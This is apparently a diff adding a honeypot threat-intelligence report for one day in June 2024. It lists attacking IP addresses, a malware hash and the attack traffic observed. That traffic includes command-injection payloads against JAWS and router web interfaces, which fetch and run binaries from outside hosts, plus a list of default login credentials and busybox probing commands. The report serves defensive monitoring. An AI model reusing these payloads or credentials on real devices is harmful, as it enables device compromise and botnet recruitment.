@@ -1,0 +1,59 @@
+Top 5 IPs for 2024-06-26 :
+
+103.79.152.202
+103.113.104.78
+178.128.212.79
+43.156.153.61
+179.185.90.114
+
+Malware Observed:
+
+
+24660180f2314dc5fe1d9375d968e9499c445bf8b3553d2b29a3069a5a3d9c48
+https://www.virustotal.com/gui/file/24660180f2314dc5fe1d9375d968e9499c445bf8b3553d2b29a3069a5a3d9c48
+
+
+Commands/exploits observed:
+
+
+/shell?cd+/tmp;+rm+-rf+shk;+wget+http:/\\/45.148.10.78/shk;+chmod+777+shk;+./shk+jaws;+rm+-rf+shk
+
+
+root
+...12345
+Admin
+...5up
+admin
+...1234
+admin
+...1988
+root
+...54321
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox SQCAS
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SQCAS
+tftp; wget; /bin/busybox SQCAS
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox SQCAS
+rm .s; exit
+q
+
+
+
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Host: <Host IP>
+User-Agent: Linux Gnu (cow)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf nk3; wget http://152.32.237.129/nk3; chmod 777 nk3; ./nk3 blink; rm -rf nk3;
